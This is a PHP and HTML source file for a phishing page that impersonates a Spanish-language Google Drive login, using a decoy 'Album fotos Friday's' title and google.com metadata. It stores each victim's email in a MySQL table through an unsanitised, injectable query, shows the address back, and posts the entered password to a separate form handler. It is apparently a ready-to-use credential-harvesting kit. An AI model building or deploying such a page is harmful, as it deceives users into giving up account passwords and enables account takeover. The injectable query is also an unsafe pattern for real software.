<?php
	include_once("./admin/db.php");

	$server;
	$username;
	$passwd;
	$db;

    $conn = mysqli_connect($server, $username, $passwd, $db);
    // Check connection
    if($conn === false){
		echo "<a href='./admin/config.php'>Edit your DB connection params</a>";
        die("ERROR: Could not connect. " 
        . mysqli_connect_error()); 
    }
    // Taking all 5 values from the form data(input)
    $email = $_REQUEST['email'];
	//$password = $_REQUEST['inputusername'];
                    
    // Performing insert query execution
    // here our table name is college
    $sql = "INSERT INTO valores VALUES ('$email','')";
                 
    if(mysqli_query($conn, $sql)){
        #echo "<h3>data stored in a database successfully." 
        #. " Please browse your localhost php my admin" 
        #. " to view the updated data</h3><br>"; 
        #echo nl2br("$email\n");
    } 
    else{
        echo "<a href='./admin/config.php'>Edit your DB connection params</a> $sql"
        . mysqli_error($conn);
    }
                      
    // Close connection
    mysqli_close($conn);
?>
<!DOCTYPE html>
<html>
    <head>
	<meta charset="utf-8">
	<meta property="og:site_name" content="drive.google.com">
	<meta property="og:title" content="Album fotos Friday's (2021-22)" />
	<meta property="og:description" content="Google Drive es una herramienta gratuita basada en Web para crear, subir y compartir documentos online con la posibilidad de colaborar en grupo. Google Drive permite: Crear, editar y subir documentos." />
	<meta property="og:image" itemprop="image" content="./images/drivelogo.png">
	<meta property="og:type" content="website" />
	<meta name="viewport" content="width=device-width, user-scalable=no">
	<link rel="icon" type="image/x-icon" href="./images/googlecircular.png">
	<link rel="stylesheet" type="text/css" href="./css/passwd-page.css">
	<title>Google Drive: inicio de sesión</title>

</head>
<body onload="myFunction()">
	<center>
		<div id="login">
			<div id="loader">
				<div id="loader-insd"></div>
			</div>
			<img src="./images/entirelogo.png" alt="logo" width="75" height="25">
			<?php
			    $sum = 0;
			    $length  = strlen($email);
			    $total = $length;
			    $total = $total + 160;
			    if($length < 6){
			        $total = $total + $length;
			    }
			    elseif($length > 6 && $length < 10){
			        $total = $total*1.3;
			    }
			    elseif ($length > 10 && $length < 25){
			        $total = $total*1.6;
			    }
			    else{
			        $total = $total*2;
			    }
            ?>
			<h1><?php echo"$email"?></h1>
			<div id="emailbutton" style="width:<?php echo "$total";?>px"
			
			onclick="window.open.href("https://drive.nasneas.com", "_self');">
			    <img class="logo-account" src="./images/icon.png" width="17" height="17" alt="icon">
			    <!--
			    If the person just clicks enter, without "@gmail.com", it will add it.
			    -->
			    <?php 
			        $word = "@gmail.com";
                    if(strpos($email, $word) !== false){
                        echo "$email";
                    } else{
                        echo "$email$word";
                    }
			    ?>
			    <img class="arrow-email" src="./images/arrow.png" alt="arrow" width="17" height="17">
			</div>
			<form method="post" action="./form.php"> 
				<div id="invisible">Introduce tu contraseña</div>
            	<input id="inputusername" onclick="document.getElementById('invisible').style.display='block'" type="password" placeholder="Introduce tu contraseña" name="password" required> 
			<div class="passwd-div">
		    	<input id="checkbox" togglePassword.addEventListener("click", toggleClicked); type="checkbox">
			    <label class="textcheckbox">Mostrar contraseña</label>
			</div>
			<script>
				const password = document.getElementById("inputusername");
				const togglePassword = document.getElementById("checkbox");
				
				togglePassword.addEventListener("click", toggleClicked);
					function toggleClicked() {  
					if (this.checked) {
						password.type = "text";
					} else {
						password.type = "password";
					}
					}
			</script>
			<br>
			<!--<p class="nopc">¿No es tu ordenador? Usa una ventana privada para iniciar sesión. <a class="nopclink" href="https://support.google.com/accounts/answer/2917834?visit_id=637794134369769555-1053720231&p=signin_privatebrowsing&hl=es&rd=1">Más información</a></p>-->
			<div class="divaccount">
			<a class="createaccount" href="https://accounts.google.com/signup/v2/webcreateaccount?service=wise&continue=http%3A%2F%2Fdrive.google.com%2F%3Futm_source%3Den&ltmpl=drive&dsh=S1879578602%3A1643818208275050&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp">¿Has olvidado tu contraseña?</a><input class="continue" type="submit" name="Siguiente" value="Siguiente" accesskey="enter" onclick="alerts();"></form>
			</div>
		</div>
		<div id="mediadiv"><p class="pleft">Español (España)<img class="arrow" src="./images/blackarrow.png" width="10" height="10" alt="arrow"></p><p class="pright"><a class="linksright" href="https://support.google.com/accounts?hl=es#topic=3382296">Ayuda </a><a class="linksright spacingleft" href="https://policies.google.com/privacy?gl=ES&hl=es">Privacidad </a><a class="linksright spacingleft" href="https://policies.google.com/terms?gl=ES&hl=es">Términos</a></p></div>

	</center>
	<script>
	    var input = document.getElementById("myInput");
        input.addEventListener("keyup", function(event) {
            if (event.keyCode === 13) {
                event.preventDefault();
                document.getElementById("myBtn").click();
                }
        });
		var myVar;
		function myFunction() {
		  myVar = true;
		  do{
		  	document.getElementById("loader").style.opacity = "100%";
		  	document.getElementById("login").style.opacity= "45%";
		  	myVar = false
		  }while(myVar == true);
		  myVar = setTimeout(showPage, 900);
		}

		function showPage() {
		  document.getElementById("login").style.opacity= "100%";
		  document.getElementById("loader").style.display = "none";
		  document.getElementById("myDiv").style.display = "block";
		}
	</script>
</html>